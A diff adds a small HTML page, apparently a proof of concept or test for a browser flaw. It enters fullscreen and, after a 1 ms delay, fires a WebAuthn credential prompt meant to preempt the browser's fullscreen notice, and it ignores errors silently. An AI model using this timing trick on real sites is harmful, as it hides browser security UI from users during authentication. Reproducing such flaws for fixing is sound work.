@@ -1,0 +1,25 @@
+<html>
+  <button id="btn">Enter fullscreen</button>
+  <script>
+    document.getElementById("btn").onclick = async function () {
+      // Request fullscreen
+      document.body.webkitRequestFullScreen();
+
+      // Minimal delay (1ms) to allow fullscreen entry but preempt native fullscreen UI
+      setTimeout(async function () {
+        try {
+          await navigator.credentials.get({
+            publicKey: {
+              challenge: new Uint8Array([0x8C, 0xFA, 0x1D]),
+              rpId: location.hostname,
+              userVerification: "preferred",
+              timeout: 60000
+            }
+          });
+        } catch (e) {
+          // Ignore any errors silently
+        }
+      }, 1);
+    }
+  </script>
+</html>
